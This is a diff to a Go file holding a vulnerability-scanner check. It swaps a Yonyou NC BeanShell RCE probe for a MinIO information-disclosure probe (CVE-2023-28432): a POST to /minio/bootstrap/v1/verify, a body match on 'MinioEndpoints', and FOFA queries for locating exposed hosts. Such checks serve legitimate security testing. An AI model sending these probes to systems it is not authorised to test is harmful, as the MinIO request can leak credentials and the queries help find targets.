@@ -6,15 +6,15 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "用友NC BeanShell RCE",
+  "Name": "MinIO 信息泄露漏洞(CVE-2023-28432)",
   "Description": "",
   "Product": "",
   "Homepage": "",
-  "DisclosureDate": null,
+  "DisclosureDate": "2023-03-23",
   "Author": "清晨",
-  "FofaQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "GobyQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "Level": "3",
+  "FofaQuery": "app=\"minio\" || product=\"MINIO-Browser\"",
+  "GobyQuery": "app=\"minio\" || product=\"MINIO-Browser\"",
+  "Level": "2",
   "Impact": "",
   "Recommendation": "",
   "References": [],
@@ -29,10 +29,12 @@ func init() {
     "AND",
     {
       "Request": {
-        "method": "GET",
-        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
+        "method": "POST",
+        "uri": "/minio/bootstrap/v1/verify",
         "follow_redirect": true,
-        "header": {},
+        "header": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
         "data_type": "text",
         "data": ""
       },
@@ -51,7 +53,7 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "BeanShell",
+            "value": "\"MinioEndpoints\"",
             "bz": ""
           }
         ]
@@ -107,7 +109,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "用友NC BeanShell RCE",
+      "Name": "MinIO 信息泄露漏洞(CVE-2023-28432)",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +118,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "yonyou NC BeanShell RCE",
+      "Name": "MinIO information disclosure(CVE-2023-28432)",
       "Product": "",
       "Description": "",
       "Recommendation": "",
